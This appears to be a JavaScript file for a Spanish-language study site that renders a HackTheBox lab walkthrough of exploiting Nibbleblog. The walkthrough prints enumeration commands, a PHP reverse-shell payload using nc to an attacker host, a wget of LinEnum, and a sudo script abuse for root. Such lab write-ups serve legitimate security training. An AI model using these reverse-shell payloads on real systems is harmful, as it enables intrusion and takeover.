// Datos de ejercicios
const ejercicios = [
    {
        nombre: "HTB - Explotación de Nibbleblog",
        enlace: "#",
        contenido: `
            <h3>Exención de responsabilidad</h3>
            <p>Este contenido tiene fines educativos y debe utilizarse en entornos controlados.</p>
            <h3>Fase I: Enumeración y Acceso</h3>
            <pre><code>nmap -sV --open -oA Upload_php_initial_scan -n -Pn -sS -v 10.129.168.126</code></pre>
            <h4>Verificación de la web con cURL</h4>
            <pre><code>curl http://10.129.168.126:80</code></pre>
            <h4>Identificación de tecnologías con WhatWeb</h4>
            <pre><code>whatweb http://10.129.168.126:80/nibbleblog</code></pre>
            <h4>Enumeración de directorios con Gobuster</h4>
            <pre><code>gobuster dir -u http://10.129.168.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30</code></pre>
            <h4>Obtención de una Shell Reversa</h4>
            <pre><code>
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1234 >/tmp/f"); ?>
            </code></pre>
            <h3>Fase II: Escalada de Privilegios</h3>
            <h4>Uso de LinEnum</h4>
            <pre><code>wget http://10.10.10.X:1234/LinEnum.sh</code></pre>
            <h4>Abuso de permisos en scripts</h4>
            <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1235 >/tmp/f' | tee -a monitor.sh</code></pre>
            <h4>Obtención de acceso root</h4>
            <pre><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></pre>
        `
    }
];

// Función para generar la lista de ejercicios
document.addEventListener("DOMContentLoaded", function() {
    const listaEjercicios = document.getElementById("ejercicios-container");
    const tituloEjercicio = document.getElementById("titulo-ejercicio");
    const detalleEjercicio = document.getElementById("detalle-ejercicio");

    ejercicios.forEach((ejercicio, index) => {
        const li = document.createElement("li");
        const link = document.createElement("a");
        link.textContent = ejercicio.nombre;
        link.href = "#";
        link.addEventListener("click", function(event) {
            event.preventDefault();
            tituloEjercicio.textContent = ejercicio.nombre;
            detalleEjercicio.innerHTML = ejercicio.contenido;
        });
        li.appendChild(link);
        listaEjercicios.appendChild(li);

        // Cargar el primer ejercicio por defecto
        if (index === 0) {
            tituloEjercicio.textContent = ejercicio.nombre;
            detalleEjercicio.innerHTML = ejercicio.contenido;
        }
    });
});
